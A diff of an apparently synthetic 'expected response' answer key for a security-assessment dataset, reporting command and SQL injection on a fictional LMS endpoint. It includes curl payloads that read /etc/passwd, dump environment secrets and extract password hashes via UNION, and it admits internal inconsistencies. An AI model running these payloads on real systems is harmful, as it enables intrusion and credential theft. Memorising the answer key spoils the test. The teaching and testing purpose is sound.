@@ -1,63 +1,68 @@
 # Expected Response
 
 ## System
-- Domain: Education / EdTech LMS
-- System: LearnPath Assessment Platform
+- System: LearnPath Assessment Platform v1.8.0
+- Domain: EDUCATION / EDTECH LMS
 - Example ID: INJ-0116
-- Vulnerability: Command Injection
+- Risk ID: RISK-INJ-116
+- Vulnerability: Command Injection (CMDi)
 
-## Priority Findings
+## Findings
 
-### Finding 1: Command Injection on `/api/v1/users`
-**Severity:** Critical
-**Category:** Injection (from data/knowledge/injections)
+### 1. Command Injection on `/api/v3/records?username=` (HAR Primary)
 
-**Summary:**
-The `/api/v1/users` endpoint accepts a `search` query parameter that is directly
-interpolated into a raw database query without sanitization. This enables Command Injection (CMDi),
-allowing an attacker to bypass authentication, extract all records, or execute arbitrary operations.
+The `username` parameter is passed to a backend process that performs OS-level execution (Section 2.0: "OS-level execution — primary data store"). The payload `; cat /etc/passwd` uses shell separator `;` to inject an arbitrary OS command after the expected command. The HAR response returns SQL-shaped user data, indicating a dual code path (SQL lookup and/or OS command execution).
+
+**Note on internal inconsistency:** The code snippet (Section 3.0) shows raw SQL string concatenation (`SELECT * FROM records WHERE username = '...'`) which conflicts with the declared "OS-level execution" backend. The HAR payload is a CMDi shell separator payload (`; cat /etc/passwd`) and the declared vulnerability is Command Injection. Primary demonstration uses CMDi (declared); SQL path noted as secondary.
 
 **Evidence from HAR:**
-- Endpoint: `GET /api/v1/users?search=; cat /etc/passwd`
-- Response: HTTP 200 with **all records returned** including password hashes and admin accounts
-- The query constructed: `SELECT * FROM users WHERE search = '; cat /etc/passwd'`
-  evaluates to true for all rows when the payload is `; cat /etc/passwd`
+- Endpoint: `GET /api/v3/records?username=; cat /etc/passwd`
+- Payload: shell separator `;` followed by `cat /etc/passwd`
+- Response: HTTP 200 with user records including admin `password_hash` (SQL path response)
 
-**Root Cause:**
-- Raw string concatenation used to build database query
-- No parameterized query / prepared statement
-- Application DB account has excessive privileges (`db_owner`)
+## Reproduction
 
-## Steps to Reproduce
-
-### Step 1 — Normal request (baseline)
+**Step 1 — Baseline:**
 ```bash
-curl -s "https://api.learnpath-asses.example.com/api/v1/users?search=normalvalue" \
+curl -s "https://api.learnpath-asses.example.com/api/v3/records?username=normalvalue" \
   -H "Authorization: Bearer <VALID_TOKEN>"
 ```
-Expected: Returns matching records only.
+**Expected:** Returns matching records only.
 
-### Step 2 — Inject CMDi payload
+**Step 2 — CMDi: OS command injection via shell separator (primary HAR attack):**
 ```bash
-curl -s "https://api.learnpath-asses.example.com/api/v1/users?search=;%20cat%20/etc/passwd" \
+curl -s "https://api.learnpath-asses.example.com/api/v3/records?username=;%20cat%20/etc/passwd" \
   -H "Authorization: Bearer <VALID_TOKEN>"
 ```
-**Vulnerable outcome:** All rows returned, including admin password hashes.
-**Secure outcome:** 400 Bad Request / 0 results / sanitized error message.
+**Vulnerable outcome:** `/etc/passwd` contents returned (CMDi) or SQL user records (SQL path) — either confirms unvalidated shell operator injection.
 
-### Step 3 — Privilege escalation (if DB over-privileged)
+**Step 3 — CMDi: identity enumeration:**
 ```bash
-# SQLi variant: attempt to read OS-level files (if DB runs as LocalSystem)
-curl -s "https://api.example.com/api/v1/users?search=' UNION SELECT null,null,load_file('/etc/passwd')--" \
+curl -s "https://api.learnpath-asses.example.com/api/v3/records?username=;%20id%3B%20whoami" \
   -H "Authorization: Bearer <VALID_TOKEN>"
 ```
+**Vulnerable outcome:** Running user identity (UID, GID) and username returned — confirms OS-level code execution.
 
-### Step 4 — Verbose error confirmation
+**Step 4 — CMDi: environment variable dump (credential exfiltration):**
 ```bash
-curl -s "https://api.example.com/api/v1/users?search='" \
+curl -s "https://api.learnpath-asses.example.com/api/v3/records?username=;%20env" \
   -H "Authorization: Bearer <VALID_TOKEN>"
 ```
-**Expected verbose error (if misconfigured):** SQL syntax error message leaking table name, column names, or DB version.
+**Vulnerable outcome:** Application environment variables returned — database credentials, JWT secrets, API keys exposed. In EdTech LMS: student PII database credentials, LMS admin API keys.
+
+**Step 5 — SQLi path: data exfiltration via UNION (db_owner, from code snippet):**
+```bash
+curl -s "https://api.learnpath-asses.example.com/api/v3/records?username=' UNION SELECT username,password_hash,role FROM users--" \
+  -H "Authorization: Bearer <VALID_TOKEN>"
+```
+**Vulnerable outcome:** All user credentials returned including `role: "ADMIN"` — as observed in HAR response.
+
+**Step 6 — Verbose error confirmation:**
+```bash
+curl -s "https://api.learnpath-asses.example.com/api/v3/records?username='" \
+  -H "Authorization: Bearer <VALID_TOKEN>"
+```
+**Expected verbose error:** SQL/shell error leaking table name `records`, column names, or server version.
 
 ## Secure Outcome
 ```json
@@ -65,8 +70,9 @@ curl -s "https://api.example.com/api/v1/users?search='" \
 ```
 
 ## Remediation
-1. **Use parameterized queries / prepared statements everywhere:** Replace string concatenation with `?` or named parameters.
-2. **Restrict DB account privileges:** Application account should only have SELECT/INSERT/UPDATE/DELETE on required tables.
-3. **Disable verbose error messages in production:** Return generic 500/400 errors without DB details.
-4. **Deploy input validation middleware:** Reject inputs containing SQL metacharacters (`'`, `"`, `;`, `--`, `/*`).
-5. **ORM audit:** Review all `raw()` or native query calls in ORM usage; apply parameterization.
+- **CMDi fix (RISK-INJ-116):** Never pass user-supplied input directly to OS command execution. Use allowlisted values only. If OS commands must be parameterized, use language-level safe APIs (`child_process.execFile` with argument array in Node.js) instead of `exec` with string interpolation.
+- **SQLi fix:** Replace raw string concatenation with parameterized queries throughout `/api/v3/records`.
+- **Restrict DB account:** Application must not run as `db_owner`.
+- **Restrict OS process user:** Application process must not run as root or privileged system user.
+- **Deploy input validation middleware:** Reject shell metacharacters (`;`, `|`, `&`, `` ` ``, `$`, `(`, `)`) in query parameters.
+- **Disable verbose error messages in production.**
